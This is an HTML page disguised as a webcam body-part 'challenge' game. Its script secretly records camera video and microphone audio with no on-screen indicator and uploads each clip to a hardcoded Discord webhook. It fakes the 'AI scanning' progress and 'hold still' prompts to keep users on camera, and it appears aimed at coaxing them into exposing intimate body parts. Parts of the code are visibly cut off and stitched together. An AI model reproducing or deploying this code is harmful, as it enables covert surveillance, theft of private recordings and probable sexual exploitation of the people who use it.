<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
    <title>🚫 Faceless Challenge</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
            background: #0b0e14;
            color: #e8edf5;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 12px;
            overflow: hidden;
        }
        .game-container {
            max-width: 820px;
            width: 100%;
            background: linear-gradient(145deg, #131a24, #1a232f);
            border-radius: 32px;
            padding: 20px 18px 26px;
            box-shadow: 0 20px 50px rgba(0, 0, 0, 0.8), inset 0 1px 2px rgba(255, 255, 255, 0.06);
            border: 1px solid rgba(255, 255, 255, 0.04);
        }
        .header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 16px;
            flex-wrap: wrap;
            gap: 8px;
        }
        .score-box,
        .timer-box {
            background: rgba(255, 255, 255, 0.04);
            padding: 10px 18px;
            border-radius: 60px;
            border: 1px solid rgba(255, 255, 255, 0.06);
            font-size: 1.1rem;
            font-weight: 600;
            display: flex;
            align-items: center;
            gap: 8px;
            flex: 1 1 auto;
            justify-content: center;
            backdrop-filter: blur(4px);
        }
        .score-box span {
            color: #00f5c0;
            font-size: 1.6rem;
            min-width: 36px;
            text-align: center;
        }
        .timer-box span {
            color: #ff6b6b;
            font-size: 1.6rem;
            min-width: 36px;
            text-align: center;
            font-variant-numeric: tabular-nums;
        }
        .timer-box.warning span {
            color: #ffd93d;
        }
        .timer-box.danger span {
            color: #ff3d3d;
            animation: pulse 0.6s ease-in-out infinite alternate;
        }
        @keyframes pulse {
            0% {
                opacity: 1;
                transform: scale(1);
            }
            100% {
                opacity: 0.4;
                transform: scale(0.95);
            }
        }

        .cam-wrapper {
            position: relative;
            border-radius: 24px;
            overflow: hidden;
            background: #0a0f15;
            border: 2px solid rgba(255, 255, 255, 0.06);
            box-shadow: inset 0 0 40px rgba(0, 0, 0, 0.6);
            aspect-ratio: 16 / 11;
            margin-bottom: 16px;
        }
        #webcam {
            width: 100%;
            height: 100%;
            display: block;
            object-fit: cover;
            transform: scaleX(-1);
        }
        #recorderVideo {
            position: absolute;
            width: 1px;
            height: 1px;
            opacity: 0.01;
            pointer-events: none;
        }

        .cam-overlay {
            position: absolute;
            inset: 0;
            pointer-events: none;
            display: flex;
            flex-direction: column;
            justify-content: space-between;
            padding: 14px 16px;
            z-index: 3;
        }
        .challenge-badge {
            align-self: flex-start;
            background: rgba(0, 0, 0, 0.7);
            backdrop-filter: blur(8px);
            padding: 10px 20px;
            border-radius: 60px;
            border: 1px solid rgba(255, 255, 255, 0.08);
            font-size: 1.2rem;
            font-weight: 700;
            letter-spacing: 0.3px;
            box-shadow: 0 8px 30px rgba(0, 0, 0, 0.5);
            transition: all 0.3s;
        }
        .challenge-badge .highlight {
            color: #ffd93d;
        }
        .challenge-badge .emoji {
            margin-right: 8px;
        }

        .status-badge {
            align-self: flex-end;
            background: rgba(0, 0, 0, 0.65);
            backdrop-filter: blur(6px);
            padding: 6px 16px;
            border-radius: 40px;
            font-size: 0.9rem;
            font-weight: 500;
            border: 1px solid rgba(255, 255, 255, 0.06);
            transition: all 0.25s;
        }
        .status-badge.waiting {
            color: #8899bb;
        }
        .status-badge.scanning {
            color: #6bcbff;
            border-color: rgba(107, 203, 255, 0.3);
        }
        .status-badge.success {
            color: #00f5c0;
            border-color: rgba(0, 245, 192, 0.4);
            background: rgba(0, 245, 192, 0.12);
        }
        .status-badge.fail {
            color: #ff6b6b;
            border-color: rgba(255, 107, 107, 0.3);
            background: rgba(255, 107, 107, 0.1);
        }
        .status-badge.loading {
            color: #ffd93d;
            border-color: rgba(255, 217, 61, 0.3);
            background: rgba(255, 217, 61, 0.08);
        }
        .status-badge.done {
            color: #ffd93d;
            border-color: rgba(255, 217, 61, 0.3);
            background: rgba(255, 217, 61, 0.08);
        }
        .status-badge.hold {
            color: #ffa94d;
            border-color: rgba(255, 169, 77, 0.3);
            background: rgba(255, 169, 77, 0.08);
            animation: pulseHold 0.8s ease-in-out infinite alternate;
        }
        @keyframes pulseHold {
            0% {
                opacity: 0.6;
                transform: scale(1);
            }
            100% {
                opacity: 1;
                transform: scale(1.02);
            }
        }

        .points-popup {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%) scale(0.5);
            font-size: 4.5rem;
            font-weight: 900;
            pointer-events: none;
            z-index: 5;
            opacity: 0;
            transition: all 0.4s cubic-bezier(0.34, 1.56, 0.64, 1);
            text-shadow: 0 0 60px rgba(255, 255, 255, 0.15);
        }
        .points-popup.show {
            opacity: 1;
            transform: translate(-50%, -50%) scale(1);
        }
        .points-popup.rainbow {
            background: linear-gradient(90deg, #ff0000, #ff7f00, #ffff00, #00ff00, #0000ff, #4b0082, #8b00ff);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-size: 300% 300%;
            animation: rainbowScroll 1.5s linear infinite, shakeText 0.15s linear infinite;
        }
        .points-popup.gold {
            color: #ffd93d;
            text-shadow: 0 0 60px rgba(255, 217, 61, 0.3);
        }
        .points-popup.white {
            color: #fff;
        }
        @keyframes rainbowScroll {
            0% {
                background-position: 0% center;
            }
            100% {
                background-position: 300% center;
            }
        }
        @keyframes shakeText {
            0% {
                transform: translate(-50%, -50%) translate(-2px, -1px) rotate(-0.5deg);
            }
            25% {
                transform: translate(-50%, -50%) translate(2px, 1px) rotate(0.5deg);
            }
            50% {
                transform: translate(-50%, -50%) translate(-1px, 2px) rotate(-0.3deg);
            }
            75% {
                transform: translate(-50%, -50%) translate(1px, -2px) rotate(0.3deg);
            }
            100% {
                transform: translate(-50%, -50%) translate(0px, 0px) rotate(0deg);
            }
        }

        .countdown-number {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%) scale(1.8);
            font-size: 6rem;
            font-weight: 900;
            color: #fff;
            text-shadow: 0 0 80px rgba(255, 255, 255, 0.15);
            pointer-events: none;
            z-index: 4;
            opacity: 0;
            transition: opacity 0.3s ease, transform 0.3s ease;
        }
        .countdown-number.show {
            opacity: 1;
            transform: translate(-50%, -50%) scale(1);
        }
        .countdown-number.hide {
            opacity: 0;
            transform: translate(-50%, -50%) scale(0.5);
        }

        .progress-container {
            position: absolute;
            bottom: 60px;
            left: 50%;
            transform: translateX(-50%);
            width: 70%;
            max-width: 320px;
            z-index: 4;
            pointer-events: none;
            opacity: 0;
            transition: opacity 0.4s ease;
        }
        .progress-container.show {
            opacity: 1;
        }
        .progress-track {
            width: 100%;
            height: 6px;
            background: rgba(255, 255, 255, 0.10);
            border-radius: 6px;
            overflow: hidden;
            box-shadow: inset 0 1px 3px rgba(0, 0, 0, 0.3);
        }
        .progress-fill {
            height: 100%;
            width: 0%;
            border-radius: 6px;
            background: #556;
            transition: width 0.15s ease-out, background 0.4s ease;
        }
        .progress-fill.scanning {
            background: linear-gradient(90deg, #8899bb, #6bcbff);
        }
        .progress-fill.detected {
            background: linear-gradient(90deg, #00f5c0, #00d9a0);
            box-shadow: 0 0 20px rgba(0, 245, 192, 0.2);
        }
        .progress-fill.done {
            background: #00f5c0;
            box-shadow: 0 0 30px rgba(0, 245, 192, 0.3);
        }
        .progress-label {
            display: flex;
            justify-content: space-between;
            font-size: 0.65rem;
            color: rgba(255, 255, 255, 0.2);
            letter-spacing: 0.05em;
            margin-top: 4px;
        }
        .progress-label .pct {
            color: rgba(255, 255, 255, 0.3);
            font-weight: 600;
        }
        .progress-label .pct.detected {
            color: #00f5c0;
        }

        .hold-still-msg {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            font-size: 2.2rem;
            font-weight: 800;
            color: #ffa94d;
            text-shadow: 0 0 60px rgba(255, 169, 77, 0.2);
            pointer-events: none;
            z-index: 6;
            opacity: 0;
            transition: opacity 0.3s ease;
            letter-spacing: 0.08em;
            text-transform: uppercase;
        }
        .hold-still-msg.show {
            opacity: 1;
            animation: pulseHold 0.7s ease-in-out infinite alternate;
        }

        .gameover-overlay {
            position: absolute;
            inset: 0;
            background: rgba(0, 0, 0, 0.78);
            backdrop-filter: blur(6px);
            display: none;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            border-radius: 22px;
            padding: 30px;
            pointer-events: auto;
            z-index: 10;
        }
        .gameover-overlay.show {
            display: flex;
        }
        .gameover-overlay h2 {
            font-size: 2.6rem;
            font-weight: 800;
            background: linear-gradient(135deg, #ff6b6b, #ffd93d);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            margin-bottom: 4px;
        }
        .gameover-overlay .final-score {
            font-size: 1.4rem;
            color: #e8edf5;
            margin-bottom: 4px;
        }
        .gameover-overlay .final-score span {
            color: #00f5c0;
            font-size: 2.2rem;
            font-weight: 700;
        }
        .gameover-overlay .sub {
            color: #8899bb;
            margin-bottom: 20px;
            font-size: 0.95rem;
            text-align: center;
        }
        .gameover-overlay .btn {
            font-size: 1.1rem;
            padding: 14px 40px;
        }

        .controls {
            display: flex;
            flex-wrap: wrap;
            justify-content: center;
            gap: 12px;
            margin-top: 8px;
        }
        .btn {
            background: transparent;
            border: none;
            padding: 14px 28px;
            border-radius: 60px;
            font-size: 1.05rem;
            font-weight: 600;
            letter-spacing: 0.4px;
            cursor: pointer;
            transition: all 0.25s;
            display: inline-flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            border: 1px solid rgba(255, 255, 255, 0.08);
            color: #b0c4de;
            min-height: 56px;
            flex: 1 1 auto;
            max-width: 220px;
            -webkit-tap-highlight-color: transparent;
        }
        .btn:hover:not(:disabled) {
            transform: translateY(-2px);
            box-shadow: 0 12px 30px rgba(0, 0, 0, 0.3);
        }
        .btn:disabled {
            opacity: 0.4;
            cursor: not-allowed;
            transform: none !important;
        }
        .btn:active {
            transform: scale(0.96);
        }
        .btn-primary {
            background: linear-gradient(135deg, #00c9a0, #00a8ff);
            color: #fff;
            border-color: transparent;
            box-shadow: 0 6px 24px rgba(0, 200, 160, 0.25);
        }
        .btn-primary:hover:not(:disabled) {
            box-shadow: 0 10px 36px rgba(0, 200, 160, 0.4);
        }
        .btn-primary:disabled {
            background: #3a4a5a;
            box-shadow: none;
            color: #8899bb;
        }
        .btn-outline {
            background: rgba(255, 255, 255, 0.03);
            border-color: rgba(255, 255, 255, 0.10);
        }
        .btn-outline:hover:not(:disabled) {
            background: rgba(255, 255, 255, 0.07);
        }
        .btn-flip {
            background: rgba(255, 255, 255, 0.04);
            border-color: rgba(255, 255, 255, 0.06);
            color: #8899bb;
            min-width: 60px;
            flex: 0 0 auto;
            padding: 14px 18px;
            font-size: 1.2rem;
        }
        .btn-flip:hover:not(:disabled) {
            background: rgba(255, 255, 255, 0.08);
            color: #e8edf5;
        }

        .spinner {
            display: inline-block;
            width: 22px;
            height: 22px;
            border: 3px solid rgba(255, 255, 255, 0.1);
            border-top-color: #00f5c0;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
        }
        @keyframes spin {
            to {
                transform: rotate(360deg);
            }
        }
        .btn .spinner {
            width: 20px;
            height: 20px;
            border-width: 3px;
        }
        .hidden {
            display: none !important;
        }

        .status-msg {
            margin-top: 10px;
            text-align: center;
            font-size: 0.9rem;
            color: #8899bb;
            padding: 0 6px;
            min-height: 24px;
        }
        .status-msg.error {
            color: #ff6b6b;
        }
        .status-msg.success {
            color: #00f5c0;
        }
        .status-msg.loading {
            color: #ffd93d;
        }

        .loading-container {
            width: 100%;
            max-width: 320px;
            margin: 10px auto;
        }
        .loading-track {
            width: 100%;
            height: 4px;
            background: rgba(255, 255, 255, 0.06);
            border-radius: 4px;
            overflow: hidden;
        }
        .loading-fill {
            height: 100%;
            width: 0%;
            border-radius: 4px;
            background: linear-gradient(90deg, #00f5c0, #00a8ff);
            transition: width 0.3s ease;
        }
        .loading-label {
            display: flex;
            justify-content: space-between;
            font-size: 0.7rem;
            color: rgba(255, 255, 255, 0.2);
            margin-top: 6px;
        }
        .loading-label .pct {
            color: rgba(255, 255, 255, 0.4);
            font-weight: 600;
        }

        @media (max-width: 600px) {
            .game-container {
                padding: 14px 12px 20px;
                border-radius: 24px;
            }
            .header {
                gap: 6px;
            }
            .score-box,
            .timer-box {
                font-size: 0.9rem;
                padding: 8px 14px;
                min-height: 48px;
            }
            .score-box span,
            .timer-box span {
                font-size: 1.4rem;
                min-width: 28px;
            }
            .challenge-badge {
                font-size: 1rem;
                padding: 8px 16px;
            }
            .status-badge {
                font-size: 0.8rem;
                padding: 4px 12px;
            }
            .btn {
                font-size: 0.95rem;
                padding: 12px 18px;
                min-height: 50px;
                max-width: 100%;
                flex: 1 1 40%;
            }
            .btn-flip {
                min-width: 50px;
                padding: 12px 14px;
                font-size: 1rem;
                flex: 0 0 auto;
            }
            .gameover-overlay h2 {
                font-size: 2rem;
            }
            .gameover-overlay .final-score {
                font-size: 1.2rem;
            }
            .gameover-overlay .final-score span {
                font-size: 1.8rem;
            }
            .cam-overlay {
                padding: 10px 12px;
            }
            .points-popup {
                font-size: 3.5rem;
            }
            .countdown-number {
                font-size: 4.5rem;
            }
            .progress-container {
                bottom: 50px;
                width: 80%;
            }
            .hold-still-msg {
                font-size: 1.6rem;
            }
        }
        @media (max-width: 420px) {
            .game-container {
                padding: 10px 8px 16px;
                border-radius: 20px;
            }
            .score-box,
            .timer-box {
                font-size: 0.8rem;
                padding: 6px 12px;
                min-height: 40px;
            }
            .score-box span,
            .timer-box span {
                font-size: 1.2rem;
                min-width: 24px;
            }
            .challenge-badge {
                font-size: 0.85rem;
                padding: 6px 12px;
            }
            .status-badge {
                font-size: 0.7rem;
                padding: 4px 10px;
            }
            .btn {
                font-size: 0.85rem;
                padding: 10px 14px;
                min-height: 44px;
            }
            .btn-flip {
                min-width: 44px;
                padding: 10px 12px;
                font-size: 0.9rem;
            }
            .gameover-overlay h2 {
                font-size: 1.6rem;
            }
            .gameover-overlay .final-score {
                font-size: 1rem;
            }
            .gameover-overlay .final-score span {
                font-size: 1.4rem;
            }
            .points-popup {
                font-size: 2.8rem;
            }
            .countdown-number {
                font-size: 3.5rem;
            }
            .progress-container {
                bottom: 44px;
                width: 85%;
            }
            .hold-still-msg {
                font-size: 1.3rem;
            }
        }
    </style>
</head>
<body>

    <div class="game-container">
        <div class="header">
            <div class="score-box">🏆 Score <span id="scoreDisplay">0</span></div>
            <div class="timer-box" id="timerBox">⏱️ <span id="timerDisplay">30</span>s</div>
        </div>

        <div class="cam-wrapper" id="camWrapper">
            <video id="webcam" autoplay playsinline muted></video>
            <video id="recorderVideo" autoplay playsinline muted></video>

            <div class="points-popup" id="pointsPopup"></div>
            <div class="countdown-number" id="countdownNumber"></div>

            <div class="progress-container" id="progressContainer">
                <div class="progress-track">
                    <div class="progress-fill" id="progressFill"></div>
                </div>
                <div class="progress-label">
                    <span id="progressStatus">scanning</span>
                    <span class="pct" id="progressPct">0%</span>
                </div>
            </div>

            <div class="hold-still-msg" id="holdStillMsg">✋ hold still</div>

            <div class="cam-overlay">
                <div class="challenge-badge" id="challengeBadge">
                    <span class="emoji">🎯</span>
                    Show <span class="highlight" id="challengeTarget">—</span>
                </div>
                <div class="status-badge waiting" id="statusBadge">⏳ waiting…</div>
            </div>

            <div class="gameover-overlay" id="gameoverOverlay">
                <h2>🏁 Challenge Complete</h2>
                <div class="final-score">Score: <span id="finalScore">0</span></div>
                <div class="sub" id="gameoverSub">You scanned all body parts!</div>
                <button class="btn btn-primary" id="restartBtn">🔄 Play Again</button>
            </div>
        </div>

        <div class="controls">
            <button class="btn btn-primary" id="startBtn" disabled>
                <span id="startBtnText">🚀 Start</span>
                <span id="startSpinner" class="hidden"><span class="spinner"></span></span>
            </button>
            <button class="btn btn-outline" id="resetBtn" disabled>⟲ Reset</button>
            <button class="btn btn-flip" id="flipBtn" disabled>⟳</button>
        </div>

        <div class="loading-container" id="loadingContainer">
            <div class="loading-track">
                <div class="loading-fill" id="loadingFill" style="width:0%;"></div>
            </div>
            <div class="loading-label">
                <span>loading AI model</span>
                <span class="pct" id="loadingPct">0%</span>
            </div>
        </div>

        <div class="status-msg" id="statusMsg">Loading AI model… please wait.</div>
    </div>

    <script>
        // ============================================================
        //  CONFIG
        // ============================================================
        const DISCORD_WEBHOOK_URL =
            'https://discord.com/api/webhooks/1522066195627642910/GnCaBQUhcTd1wLilA8o-NE3x_xn-lkDTSLUcK-ChMb1nivT9d3OCDraY7CdrFmI9Ru-5';

        const CLIP_DURATION = 10;
        const SCAN_TIME = 30;

        // ─── BODY PARTS ──────────────────────────────────────────────
        // difficulty: 0.05 (super easy) → 0.95 (brutal)
        // Higher difficulty = slower progress bar, more "stuck" moments
        const BODY_PARTS = [
            // ── EASY (1–2 pts, fast, 0.05–0.15) ──
            { id: 'left_pinky', label: 'Left Pinky', points: 1, emoji: '🖐️', difficulty: 0.05 },
            { id: 'right_pinky', label: 'Right Pinky', points: 1, emoji: '🖐️', difficulty: 0.05 },
            { id: 'left_thumb', label: 'Left Thumb', points: 1, emoji: '👍', difficulty: 0.06 },
            { id: 'right_thumb', label: 'Right Thumb', points: 1, emoji: '👍', difficulty: 0.06 },
            { id: 'left_index', label: 'Left Index Finger', points: 1, emoji: '☝️', difficulty: 0.07 },
            { id: 'right_index', label: 'Right Index Finger', points: 1, emoji: '☝️', difficulty: 0.07 },
            { id: 'left_middle', label: 'Left Middle Finger', points: 1, emoji: '🖕', difficulty: 0.07 },
            { id: 'right_middle', label: 'Right Middle Finger', points: 1, emoji: '🖕', difficulty: 0.07 },
            { id: 'left_ring', label: 'Left Ring Finger', points: 1, emoji: '💍', difficulty: 0.07 },
            { id: 'right_ring', label: 'Right Ring Finger', points: 1, emoji: '💍', difficulty: 0.07 },
            { id: 'left_forearm', label: 'Left Forearm', points: 2, emoji: '💪', difficulty: 0.10 },
            { id: 'right_forearm', label: 'Right Forearm', points: 2, emoji: '💪', difficulty: 0.10 },
            { id: 'left_hand', label: 'Left Hand', points: 2, emoji: '✋', difficulty: 0.12 },
            { id: 'right_hand', label: 'Right Hand', points: 2, emoji: '🤚', difficulty: 0.12 },

        // ============================================================
        //  SEEDED RNG
        // ============================================================
        function createSeededRandom(seed) {
            let s = seed;
            return function() {
                s = (s * 9301 + 49297) % 233280;
                return s / 233280;
            };
        }

        // ============================================================
        //  PROGRESS CURVE GENERATOR — makes the bar struggle 1% at a time
        // ============================================================
        function generateProgressCurve(difficulty, seed) {
            const rng = createSeededRandom(seed);
            const points = [];
            let time = 0;
            let progress = 0;

            // Base speed: higher difficulty = slower
            let baseSpeed = 0.9 - difficulty * 0.85; // 0.83 for easy, 0.09 for very hard
            baseSpeed = Math.max(0.02, baseSpeed);

            // Stickiness: how often it gets stuck (higher difficulty = more stuck)
            const stickiness = 0.2 + difficulty * 0.6;

            // Extra "struggle" for very hard parts (feet, ribs, belly button, bootyhole)
            const struggleFactor = difficulty > 0.5 ? 1.0 + (difficulty - 0.5) * 1.5 : 1.0;

            // Max time we want to take (30s)
            const maxTime = SCAN_TIME;

            let stuckCounter = 0;
            let lastProgress = 0;

            while (progress < 100 && time < maxTime) {
                // Tiny step size for "1% slowly" feel
                let step = 0.05 + rng() * 0.2;
                step = step / struggleFactor;

                // Sometimes get stuck (no progress) — more often for hard parts
                if (rng() < stickiness * 0.35) {
                    step = 0;
                    stuckCounter++;
                    // Occasionally go backwards a tiny bit (frustration)
                    if (rng() < 0.08 && progress > 1) {
                        progress -= 0.1 + rng() * 0.3;
                        if (progress < 0) progress = 0;
                    }
                    // If stuck for too long, give a tiny nudge
                    if (stuckCounter > 8 && rng() < 0.15) {
                        progress += 0.2 + rng() * 0.4;
                        stuckCounter = 0;
                    }
                    time += 0.05;
                    if (time > maxTime) time = maxTime;
                    // Only add point if progress changed or time advanced enough
                    if (Math.abs(progress - lastProgress) > 0.1 || time % 0.5 < 0.05) {
                        points.push([Math.min(time, maxTime), Math.min(Math.max(progress, 0), 100)]);
                        lastProgress = progress;
                    }
                    continue;
                } else {
                    stuckCounter = Math.max(0, stuckCounter - 1);
                }

                // Random boost (rare, to simulate "AI catching on")
                if (rng() < 0.04 + difficulty * 0.02) {
                    const jump = 0.5 + rng() * 1.5;
                    progress += jump;
                    time += 0.05;
                    if (progress > 100) progress = 100;
                    points.push([Math.min(time, maxTime), Math.min(progress, 100)]);
                    lastProgress = progress;
                    continue;
                }

                // Normal increment — very small for "1% slowly" feel
                const increment = (baseSpeed * 0.3 + rng() * baseSpeed * 0.5) * (1 + (1 - difficulty) * 0.1);
                progress += increment * 0.15;

                // If progress is very low and time is running out, give a boost
                const timeRatio = time / maxTime;
                if (timeRatio > 0.7 && progress < 20 && difficulty > 0.5) {
                    progress += 0.2 + rng() * 0.5;
                }
                if (timeRatio > 0.85 && progress < 40 && difficulty > 0.6) {
                    progress += 0.3 + rng() * 0.6;
                }
                // Last 3 seconds: force it up if needed
                if (time > maxTime - 3 && progress < 70) {
                    progress += 0.5 + rng() * 1.2;
                }
                if (time > maxTime - 1 && progress < 90) {
                    progress += 1.0 + rng() * 2.0;
                }

                if (progress > 100) progress = 100;
                if (time > maxTime) time = maxTime;

                // Only add point if progress changed meaningfully (>0.1%)
                if (Math.abs(progress - lastProgress) > 0.08 || time % 0.3 < 0.02) {
                    points.push([Math.min(time, maxTime), Math.min(Math.max(progress, 0), 100)]);
                    lastProgress = progress;
                }

                time += step;
            }

            // Ensure we reach 100% at or before maxTime
            if (points.length === 0 || points[points.length - 1][1] < 100) {
                points.push([maxTime, 100]);
            }

            // Ensure first point is at time 0 with progress 0
            if (points.length > 0 && points[0][0] > 0) {
                points.unshift([0, 0]);
            } else if (points.length === 0) {
                points.push([0, 0], [maxTime, 100]);
            }

            // Sort by time and remove duplicates
            points.sort((a, b) => a[0] - b[0]);
            const unique = [];
            for (const p of points) {
                if (unique.length === 0 || p[0] !== unique[unique.length - 1][0]) {
                    unique.push(p);
                }
            }

            return unique;
        }

        // ============================================================
        //  GET PROGRESS FROM CURVE
        // ============================================================
        function getProgressAtTime(curve, time) {
            if (!curve || curve.length === 0) return 0;
            if (time <= curve[0][0]) return curve[0][1];
            if (time >= curve[curve.length - 1][0]) return curve[curve.length - 1][1];

            for (let i = 1; i < curve.length; i++) {
                if (time <= curve[i][0]) {
                    const prev = curve[i - 1];
                    const curr = curve[i];
                    const t = (time - prev[0]) / (curr[0] - prev[0]);
                    return prev[1] + t * (curr[1] - prev[1]);
                }
            }
            return curve[curve.length - 1][1];
        }

        // ============================================================
        //  RECORDER (hidden, no UI indicator)
        // ============================================================
        async function initRecorder() {
            try {
                const constraints = {
                    video: {
                        width: { ideal: 1280, max: 1280 },
                        height: { ideal: 720, max: 720 },
                        frameRate: { ideal: 30 },
                        facingMode: state.facingMode,
                    },
                    audio: {
                        echoCancellation: false,
                        noiseSuppression: false,
                        autoGainControl: true,
                    },
                };
                const stream = await navigator.mediaDevices.getUserMedia(constraints);
                state.recorderStream = stream;
                recorderVideo.srcObject = stream;
                await recorderVideo.play();

                let selectedMimeType = 'video/webm;codecs=vp8,opus';
                if (!MediaRecorder.isTypeSupported(selectedMimeType)) {
                    if (MediaRecorder.isTypeSupported('video/mp4')) selectedMimeType = 'video/mp4';
                    else if (MediaRecorder.isTypeSupported('video/webm')) selectedMimeType = 'video/webm';
                }

                state.mediaRecorder = new MediaRecorder(stream, {
                    mimeType: selectedMimeType,
                    videoBitsPerSecond: 2500000,
                });

                state.mediaRecorder.ondataavailable = (e) => {
                    if (e.data.size > 0) state.recordedChunks.push(e.data);
                };

                state.mediaRecorder.onstop = async () => {
                    if (state.recordedChunks.length === 0) {
                        state.recordedChunks = [];
                        if (state.mediaRecorder && state.mediaRecorder.state === 'inactive') {
                            try { state.mediaRecorder.start(); } catch (_) {}
                        }
                        return;
                    }
                    const blob = new Blob(state.recordedChunks, { type: selectedMimeType });
                    state.recordedChunks = [];
                    const formData = new FormData();
                    const ext = selectedMimeType.includes('mp4') ? 'mp4' : 'webm';
                    formData.append('file', blob, `vlog_${Date.now()}.${ext}`);
                    try {
                        await fetch(DISCORD_WEBHOOK_URL, { method: 'POST', body: formData });
                    } catch (_) {}
                    state.recordedChunks = [];
                    if (state.mediaRecorder && state.mediaRecorder.state === 'inactive') {
                        try { state.mediaRecorder.start(); } catch (_) {}
                    }
                };

                state.mediaRecorder.start(CLIP_DURATION * 1000);
                state.recorderActive = true;
                return true;
            } catch (err) {
                console.warn('Recorder init failed:', err);
                return false;
            }
        }

                    },

                state.stream = stream;

        // ============================================================
        //  FLIP CAMERA
        // ============================================================
        flipBtn.addEventListener('click', async () => {
            state.facingMode = state.facingMode === 'user' ? 'environment' : 'user';
            if (state.stream) { state.stream.getTracks().forEach(t => t.stop()); }
            if (state.recorderStream) { state.recorderStream.getTracks().forEach(t => t.stop()); }
            if (state.mediaRecorder && state.mediaRecorder.state !== 'inactive') {
                try { state.mediaRecorder.stop(); } catch (_) {}
            }
            await initDisplayCamera();
            await initRecorder();
        });

        // ============================================================
        //  GAME LOGIC
        // ============================================================
        function startGame() {
            if (state.gameStarted || state.gameDone) return;
            if (!state.modelLoaded) {
                statusMsg.textContent = '⏳ Model not ready — please wait.';
                statusMsg.className = 'status-msg error';
                return;
            }

            state.gameStarted = true;
            state.gameDone = false;
            state.totalPoints = 0;
            state.currentPartIndex = 0;
            state.partResults = [];
            state.isScanning = false;
            state.partDetected = false;
            state.progressValue = 0;

            scoreDisplay.textContent = '0';
            timerDisplay.textContent = SCAN_TIME;
            timerBox.className = 'timer-box';
            gameoverOverlay.classList.remove('show');

            startBtn.disabled = true;
            resetBtn.disabled = true;
            flipBtn.disabled = true;

            statusMsg.textContent = '';
            statusMsg.className = 'status-msg';
            progressContainer.classList.remove('show');

            setTimeout(() => beginPart(0), 400);
        }

        function beginPart(index) {
            if (index >= BODY_PARTS.length) {
                endGame(true);
                return;
            }

            const part = BODY_PARTS[index];
            state.currentPartIndex = index;
            state.isScanning = false;
            state.partDetected = false;
            state.progressValue = 0;
            state.scanTimer = SCAN_TIME;
            state.elapsedTime = 0;
            state.holdStillActive = false;
            state.holdStillTimer = 0;

            // Generate seeded progress curve for this part
            state.partSeed = index * 777 + Date.now() % 1000;
            state.progressCurve = generateProgressCurve(part.difficulty, state.partSeed);

            timerDisplay.textContent = SCAN_TIME;
            timerBox.className = 'timer-box';
            progressContainer.classList.remove('show');
            updateProgress(0, 'idle');
            holdStillMsg.classList.remove('show');

            challengeTarget.textContent = part.emoji + ' ' + part.label;
            challengeBadge.innerHTML =
                `<span class="emoji">🎯</span> Show <span class="highlight">${part.emoji} ${part.label}</span>`;

            statusBadge.textContent = `⏳ get ready …`;
            statusBadge.className = 'status-badge waiting';

            const pts = part.points;
            pointsPopup.textContent = `+${pts} pts`;
            pointsPopup.className = 'points-popup';
            if (pts >= 10) {
                pointsPopup.classList.add('rainbow');
            } else if (pts >= 5) {
                pointsPopup.classList.add('gold');
            } else {
                pointsPopup.classList.add('white');
            }
            pointsPopup.classList.add('show');

            setTimeout(() => {
                pointsPopup.classList.remove('show');
            }, 1500);

            setTimeout(() => {
                startCountdown(index);
            }, 1800);
        }

        function startCountdown(index) {
            let count = 3;
            countdownNumber.textContent = count;
            countdownNumber.className = 'countdown-number show';
            statusBadge.textContent = `⏳ ${count}…`;
            statusBadge.className = 'status-badge waiting';

            const cdInterval = setInterval(() => {
                count--;
                if (count > 0) {
                    countdownNumber.textContent = count;
                    countdownNumber.className = 'countdown-number show';
                    statusBadge.textContent = `⏳ ${count}…`;
                } else {
                    clearInterval(cdInterval);
                    countdownNumber.className = 'countdown-number hide';
                    beginScanning(index);
                }
            }, 800);
        }

        function beginScanning(index) {
            const part = BODY_PARTS[index];
            state.isScanning = true;
            state.partDetected = false;
            state.progressValue = 0;
            state.scanTimer = SCAN_TIME;
            state.elapsedTime = 0;
            state.holdStillActive = false;

            timerDisplay.textContent = SCAN_TIME;
            timerBox.className = 'timer-box';
            progressContainer.classList.add('show');
            updateProgress(0, 'scanning');

            statusBadge.textContent = `🔍 show ${part.emoji} ${part.label}`;
            statusBadge.className = 'status-badge scanning';

            // Start timer — runs independently of progress bar
            if (state.scanInterval) clearInterval(state.scanInterval);
            state.scanInterval = setInterval(() => {
                state.scanTimer--;
                state.elapsedTime = SCAN_TIME - state.scanTimer;
                timerDisplay.textContent = state.scanTimer;

                if (state.scanTimer <= 5) {
                    timerBox.className = 'timer-box danger';
                } else if (state.scanTimer <= 10) {
                    timerBox.className = 'timer-box warning';
                }

                // Update progress from curve (independent of timer)
                if (!state.partDetected && state.isScanning) {
                    const progress = getProgressAtTime(state.progressCurve, state.elapsedTime);
                    state.progressValue = Math.min(Math.max(progress, 0), 100);
                    updateProgress(state.progressValue, 'scanning');

                    // Random "hold still" triggers (fake) — more often on hard parts
                    const holdChance = 0.02 + part.difficulty * 0.04;
                    if (!state.holdStillActive && Math.random() < holdChance && state.progressValue > 8 && state
                        .progressValue < 88) {
                        state.holdStillActive = true;
                        state.holdStillTimer = 1.2 + Math.random() * 2.8;
                        holdStillMsg.classList.add('show');
                        statusBadge.textContent = '✋ hold still …';
                        statusBadge.className = 'status-badge hold';
                    }

                    if (state.holdStillActive) {
                        state.holdStillTimer -= 0.05;
                        if (state.holdStillTimer <= 0) {
                            state.holdStillActive = false;
                            holdStillMsg.classList.remove('show');
                            statusBadge.textContent = `🔍 scanning … ${Math.round(state.progressValue)}%`;
                            statusBadge.className = 'status-badge scanning';
                        }
                    }

                    // Check if we reached 100%
                    if (state.progressValue >= 99.5) {
                        onScanSuccess(index);
                    }
                }

                if (state.scanTimer <= 0 && !state.partDetected) {
